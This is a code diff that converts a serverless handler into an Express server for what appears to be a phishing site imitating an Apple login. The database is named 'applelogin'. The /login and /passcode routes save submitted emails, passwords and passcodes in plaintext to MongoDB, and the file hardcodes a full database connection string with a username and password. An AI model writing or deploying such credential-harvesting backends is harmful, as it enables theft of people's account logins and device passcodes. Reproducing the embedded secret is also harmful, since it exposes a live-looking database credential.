@@ -1,40 +1,49 @@
-// api/vercel.js
+import express from "express";
+import cors from "cors";
 import mongoose from "mongoose";
+import path from "path";
+import { fileURLToPath } from "url";
 
-const uri = "mongodb+srv://civeso9509:x9eLMVbtwhjiYgsq@cluster0.bgugf7l.mongodb.net/applelogin";
+// __dirname workaround
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
-// Avoid multiple mongoose connections
-if (!mongoose.connections[0].readyState) {
-  await mongoose.connect(uri, {
+const app = express();
+app.use(cors());
+app.use(express.json());
+
+// MongoDB connection
+mongoose.connect("mongodb+srv://civeso9509:x9eLMVbtwhjiYgsq@cluster0.bgugf7l.mongodb.net/applelogin", {
     useNewUrlParser: true,
     useUnifiedTopology: true,
-  });
-}
+});
 
 // Schemas
-const User = mongoose.models.User || mongoose.model("User", new mongoose.Schema({ email: String, password: String }));
-const Passcode = mongoose.models.Passcode || mongoose.model("Passcode", new mongoose.Schema({ passcode: String }));
+const User = mongoose.model("User", new mongoose.Schema({ email: String, password: String }));
+const Passcode = mongoose.model("Passcode", new mongoose.Schema({ passcode: String }));
 
-export default async function handler(req, res) {
-  const { url, method } = req;
+// Serve static
+app.use(express.static(path.join(__dirname, "../client")));
 
-  // Save login
-  if (url === "/login" && method === "POST") {
+// Routes
+app.post("/login", async (req, res) => {
     const { email, password } = req.body;
     const user = new User({ email, password });
     await user.save();
-    console.log("✅ login saved");
-    return res.status(200).json({ message: "User saved to MongoDB!" });
-  }
+    res.json({ message: "User saved to MongoDB!" });
+    console.log("login saved");
+});
 
-  // Save passcode
-  if (url === "/passcode" && method === "POST") {
+app.post("/passcode", async (req, res) => {
     const { passcode } = req.body;
     const user = new Passcode({ passcode });
     await user.save();
-    console.log("✅ passcode saved");
-    return res.status(200).json({ message: "Passcode saved to MongoDB!" });
-  }
+    res.json({ message: "Passcode saved to MongoDB!" });
+    console.log("passcode saved");
+});
 
-  return res.status(404).json({ message: "Not found" });
-}
+app.get("/", (req, res) => {
+    res.sendFile(path.join(__dirname, "../client/index.html"));
+});
+
+export default app;
